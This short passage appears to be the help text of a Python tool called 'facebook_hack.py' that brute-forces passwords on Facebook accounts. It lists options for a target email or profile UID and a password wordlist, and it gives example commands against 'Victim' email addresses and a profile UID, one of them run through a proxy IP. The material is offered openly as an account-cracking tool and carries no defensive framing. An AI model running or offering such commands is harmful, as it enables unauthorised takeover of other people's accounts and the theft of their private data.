...
OPTIONS:
       |
    |--------
    | -t <target mail> [OR] <FB UID>    ::> Specify target mail [OR] Target Profile UID
    |--------
    | -w <wordlist/passlist location>                      ::> Specify Wordlist/Passlist File Location 
    |--------
...
Examples:
        |
     |--------
     | python facebook_hack.py -t Victim@gmail.com -w /sdcard/yourpasslist.txt
     |--------
     | python facebook_hack.py -t 100001013078780 -w /sdcard/yourpasslist.txt
     |--------
     | python facebook_hack.py -t Victim@hotmail.com -w /sdcard/yourpasslist.txt -p 144.217.101.245:3129
     |--------
